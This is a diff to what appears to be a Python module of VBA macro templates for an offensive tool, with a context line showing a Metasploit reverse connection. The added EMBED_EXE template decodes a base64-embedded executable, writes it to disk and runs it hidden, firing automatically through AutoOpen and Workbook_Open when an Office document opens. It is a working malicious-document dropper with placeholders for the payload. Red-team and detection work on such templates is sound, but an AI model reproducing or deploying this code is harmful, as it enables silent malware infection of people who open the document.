@@ -412,3 +412,64 @@ Function MacroMeter()
     o.MSFConnect RHOST, RPORT
 End Function
 """
+
+
+EMBED_EXE = \
+r"""
+' Code from https://github.com/khr0x40sh/MacroShop
+' Copyright (c) 2015 khr0x40sh under MIT license
+
+Option Explicit
+
+Const TypeBinary = 1
+Const ForReading = 1, ForWriting = 2, ForAppending = 8
+
+
+Private Function decodeBase64(base64)
+    Dim DM, EL
+    Set DM = CreateObject("Microsoft.XMLDOM")
+    ' Create temporary node with Base64 data type
+    Set EL = DM.createElement("tmp")
+    EL.DataType = "bin.base64"
+    ' Set encoded String, get bytes
+    EL.Text = base64
+    decodeBase64 = EL.NodeTypedValue
+End Function
+
+Private Sub writeBytes(file, bytes)
+    Dim binaryStream
+    Set binaryStream = CreateObject("ADODB.Stream")
+    binaryStream.Type = TypeBinary
+    'Open the stream and write binary data
+    binaryStream.Open
+    binaryStream.Write bytes
+    'Save binary data to disk
+    binaryStream.SaveToFile file, ForWriting
+End Sub
+
+<<<STRINGS>>>
+
+Private Sub DecodeExec()
+    Dim out1 As String
+    <<<DECODE_CHUNKS>>>
+
+    Dim decode
+    decode = decodeBase64(out1)
+    Dim outFile
+    outFile = "<<<OUT_FILE>>>"
+    Call writeBytes(outFile, decode)
+    
+    Dim retVal
+    retVal = Shell(outFile, 0)
+End Sub
+
+
+Sub AutoOpen()
+    DecodeExec
+End Sub
+
+Sub Workbook_Open()
+    DecodeExec
+End Sub
+"""
+
